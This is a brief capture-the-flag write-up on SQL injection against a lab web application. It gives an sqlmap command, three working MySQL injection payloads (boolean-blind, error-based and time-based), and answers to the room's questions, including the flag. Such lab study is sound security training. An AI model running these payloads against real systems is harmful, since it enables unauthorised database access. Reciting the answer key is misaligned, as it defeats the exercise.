#  [Section 5 - SQL Injection]: Vulnerable Web Application

## Notes
```
sqlmap -u http://10.10.152.142 --data="msg=test" --method=POST

Parameter: msg (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=test' RLIKE (SELECT (CASE WHEN (2894=2894) THEN 0x74657374 ELSE 0x28 END))-- GQhf

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: msg=test' AND GTID_SUBSET(CONCAT(0x7162787871,(SELECT (ELT(1101=1101,1))),0x7162626b71),1101)-- AOgf

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=test' AND (SELECT 8788 FROM (SELECT(SLEEP(5)))yqXN)-- Yuqe
```

## Questions
1. How many types of sqli is the site vulnerable to?
```
3
```

2. What is the name of the database?
```
tests
```

3. How many tables are in the database?
```
2
```

4. What is the value of the flag?
```
found_me
```
